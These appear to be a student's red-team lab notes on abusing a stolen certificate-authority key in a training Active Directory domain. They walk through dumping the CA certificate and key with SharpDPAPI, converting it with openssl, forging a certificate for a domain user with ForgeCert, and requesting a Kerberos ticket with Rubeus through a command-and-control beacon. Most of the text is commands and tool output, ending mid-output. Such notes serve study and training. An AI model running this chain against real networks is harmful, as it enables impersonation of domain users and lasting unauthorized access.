IoqMYYIWZGMtMi5kZXYuY3liZXJib3RpYy5pbzAdBgNVHQ4EFgQUzk0zVHJFdk+v
QjF43pZq02Iwaw0wHwYDVR0jBBgwFoAUPgCkU1CbPBUXsoeCwh2G5MsOcecwgb8G
A1UdHwSBtzCBtDCBsaCBrqCBq4aBqGxkYXA6Ly8vQ049Y2EsQ049ZGMtMSxDTj1D
RFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
ZmlndXJhdGlvbixEQz1jeWJlcmJvdGljLERDPWlvP2NlcnRpZmljYXRlUmV2b2Nh
dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
tgYIKwYBBQUHAQEEgakwgaYwgaMGCCsGAQUFBzAChoGWbGRhcDovLy9DTj1jYSxD
Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGljLERDPWlvP2NBQ2VydGlmaWNhdGU/
YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3
DQEBCwUAA4IBAQBhHdsvejUT/+N0TiejAaReoMyImCqtk5JGcRETdRCmdqdWgCEP
a4tKFAPfZ0P8e7+ktLhbzhUa33OnO2Cn4PHGIyb/lDyxzOZNxVpWlxCT0nyWKeOA
ZaPgYMArjqkC3/ky8LiMR2rFa93DoZ941QdUavFhzI+1J2K68lx6gcIg7vYyfvsK
ZNhe62lC82QKMhAF1B+mi0fnHh3nTHRJJeWHbyplAtk9MYpT1OAy253H7KWqTef1
UCCGW1qumKkHgzdjN/vty9iqcozRlGwkGztybHps7enTGujrR/Le4ncMM/Yh1scz
IZoyr/r0dgrOrcEVS1k3AuHv1DVjbWAcRDb3
-----END CERTIFICATE-----

Folder       : C:\ProgramData\Microsoft\Crypto\SystemKeys


Folder       : C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys


[*] Hint: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


SharpDPAPI completed in 00:00:07.2616931

[X] Error triaging c2319c42033a5ca7f44e731bfd3fa2b5_d0c48e6a-1237-4eca-bb8c-9b22df87997d : Bad Data.
```
save the file as a `text file` consisting of both the `certificate` and `private key`
![[Pasted image 20231220200741.png]]

```POWERSHELL
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
openssl pkcs12 -in sub.ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
cd Desktop
ls
```z```
in `ubuntu` `WSL` session run the command given from above
```bash
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop>
openssl pkcs12 -in sub.ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:pass123
Verifying - Enter Export Password:pass123
```
`ls` to ensure file was spit out
```
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> ls
cert.pfx*  desktop.ini*  sub.ca.pem*
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop>
```
Then, build the forged certificate with [ForgeCert](https://github.com/GhostPack/ForgeCert).
note: interacting with `powershell` was a bitch in this section because I was unable to type, had to copy and paste commands.
```powershell
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\cert.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
CA Certificate Information:
  Subject:
  Issuer:         CN=ca, DC=cyberbotic, DC=io
  Start Date:     05/07/2023 08:58:00
  End Date:       04/07/2024 08:58:00
  Thumbprint:     9220C9CDD97854505A86A526D5025B2D9561B6A6
  Serial:         130000000E60810F28A9F4124200000000000E

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: nlamb@cyberbotic.io
  Issuer:
  Start Date:     21/12/2023 01:10:56
  End Date:       21/12/2024 01:10:56
  Thumbprint:     C7A92A2E6AFE3270F68ECCDAC2FE3E9B9D5D6270
  Serial:         7A1BFEBE59A4298C0D205BE0303D63F6

Done. Saved forged certificate to .\Desktop\fake.pfx with the password 'pass123'
PS C:\Users\Attacker>
```
once created utilize `cat fake.pfx | base64 -w 0` to get the `certificate` to utilize, the course didnt show us how to do this in this section - expected to refer to previous section [[3. Misconfigured Certificate Templates]]
```bash
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> ls
cert.pfx*  desktop.ini*  fake.pfx*  sub.ca.pem*
```
`cat fake.pfx | base64 -w 0`
```bash
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> cat fake.pfx | base64 -w 0
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¶
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop>
```
Even though you can specify any SubjectAltName, the user does need to be present in AD.  We can now use Rubeus to request a legitimate TGT with this forged certificate.
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate: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 /password:pass123 /nowrap
```
failed..
```powershell
[12/21 01:17:37] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate: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 /password:pass123 /nowrap
[12/21 01:17:42] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate: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